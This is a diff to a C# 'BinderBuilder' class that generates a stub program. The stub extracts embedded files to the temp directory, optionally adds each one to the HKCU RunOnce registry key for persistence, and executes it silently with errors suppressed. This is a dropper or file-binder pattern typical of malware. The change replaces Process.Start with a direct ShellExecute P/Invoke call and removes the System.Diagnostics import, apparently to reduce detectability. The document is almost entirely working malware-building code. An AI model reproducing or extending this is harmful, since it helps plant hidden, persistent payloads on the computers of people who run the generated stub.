@@ -120,11 +120,12 @@ public static class BinderBuilder
         bool anyRunOnce = entries.Any(e => e.RunOnce);
         var sb = new StringBuilder();
         sb.AppendLine("using System;");
-        sb.AppendLine("using System.Diagnostics;");
         sb.AppendLine("using System.IO;");
         sb.AppendLine("using System.Reflection;");
+        sb.AppendLine("using System.Runtime.InteropServices;");
         if (anyRunOnce) sb.AppendLine("using Microsoft.Win32;");
         sb.AppendLine("class B {");
+        sb.AppendLine("    [DllImport(\"shell32.dll\")]static extern int ShellExecute(IntPtr h,string op,string f,string par,string dir,int show);");
         sb.AppendLine("    static void Main() {");
         sb.AppendLine("        string t = Path.GetTempPath();");
         sb.AppendLine("        Assembly a = Assembly.GetExecutingAssembly();");
@@ -144,7 +145,7 @@ public static class BinderBuilder
         sb.AppendLine("            File.WriteAllBytes(p,b);");
         if (anyRunOnce)
             sb.AppendLine("            if(ro)try{var k=Registry.CurrentUser.CreateSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\",true);if(k!=null){k.SetValue(name,\"\\\"\" +p+ \"\\\"\");k.Dispose();}}catch{}");
-        sb.AppendLine("            Process.Start(new ProcessStartInfo(p){UseShellExecute=true});");
+        sb.AppendLine("            ShellExecute(IntPtr.Zero,\"open\",p,null,null,1);");
         sb.AppendLine("        }catch{}");
         sb.AppendLine("    }");
         sb.AppendLine("}");
